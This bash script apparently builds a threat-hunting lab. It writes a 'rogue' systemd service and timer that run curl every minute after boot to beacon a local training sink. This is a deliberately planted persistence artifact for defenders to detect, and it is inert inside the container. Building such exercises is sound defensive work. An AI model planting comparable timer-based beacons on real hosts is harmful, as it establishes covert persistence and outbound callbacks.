#!/usr/bin/env bash
# Declawed plant: a rogue systemd timer + service that beacons the local sink.
# systemd is not PID 1 in the container, so the units are inert here; they are
# the on-disk persistence artifact a hunter enumerates (`systemctl list-timers`
# on a real host, or the unit files directly).
set -euo pipefail
mkdir -p /etc/systemd/system
cat > /etc/systemd/system/beaconhunt-sync.service <<'UNIT'
[Unit]
Description=beaconhunt-timer (training) sync helper
[Service]
Type=oneshot
ExecStart=/usr/bin/curl -fsS --max-time 3 "http://sink:9000/beacon?src=timer"
UNIT
cat > /etc/systemd/system/beaconhunt-sync.timer <<'UNIT'
# beaconhunt-timer (training) — rogue persistence timer (local sink only)
[Unit]
Description=beaconhunt-timer schedule
[Timer]
OnBootSec=1min
OnUnitActiveSec=1min
[Install]
WantedBy=timers.target
UNIT
echo "wrote rogue systemd timer+service units"
